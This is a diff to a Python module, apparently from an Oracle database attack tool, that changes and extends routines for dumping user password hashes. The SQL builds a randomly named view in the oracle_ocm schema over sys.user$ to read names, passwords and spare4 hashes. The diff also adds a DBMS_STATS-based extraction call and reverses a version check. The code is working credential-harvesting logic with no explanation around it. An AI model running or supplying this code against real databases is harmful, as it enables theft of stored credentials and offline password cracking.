@@ -107,7 +107,7 @@ class Passwords (OracleDatabase):
 		if self.isDBVersionHigherThan12():
 			logging.info("Trying to get hashes Oracle_OCM view ")
 			randomViewName = generateRandomString(length=10)
-			REQ_CREATE_VIEW = "CREATE OR REPLACE VIEW oracle_ocm.{0} as select name, password, spare4 from sys.user$".format(randomViewName)
+			REQ_CREATE_VIEW = "CREATE OR REPLACE VIEW oracle_ocm.{0} AS SELECT name, password, spare4 FROM sys.user$".format(randomViewName)
 			REQ_DELETE_VIEW = "DROP VIEW oracle_ocm.{0}".format(randomViewName)
 			REQ_GET_PWDS    = "SELECT name, password, spare4 FROM oracle_ocm.{0}".format(randomViewName)
 			status = self.__execPLSQL__(REQ_CREATE_VIEW)
@@ -167,7 +167,7 @@ class Passwords (OracleDatabase):
 		END;
 		"""
 		logging.info("Trying to get hashes with DBMS_STAT module...")
-		if self.isDBVersionHigherThan11() == False:
+		if self.isDBVersionHigherThan11() == True:
 			logging.info("Gather table and column statistics")
 			status = self.__execPLSQL__(REQ_GATHER_STATS)
 			if isinstance(status, Exception):
@@ -254,6 +254,12 @@ class Passwords (OracleDatabase):
 				self.args['print'].goodNews("OK")
 			else:
 				self.args['print'].badNews("KO")
+			logging.info("Try to get Oracle hashed passwords via DBMS_STAT")
+			names, passwords, spare4 = self.getHashedPasswordsWithDBMS_STATS()
+			if isinstance(names, Exception):
+				self.args['print'].badNews("KO")
+			else:
+				self.args['print'].goodNews("OK")
 		self.args['print'].subtitle("Hashed Oracle passwords from history?")
 		logging.info("Try to get Oracle hashed passwords from the history table")
 		status = self.__tryToGetHashedPasswordsfromHistory__()
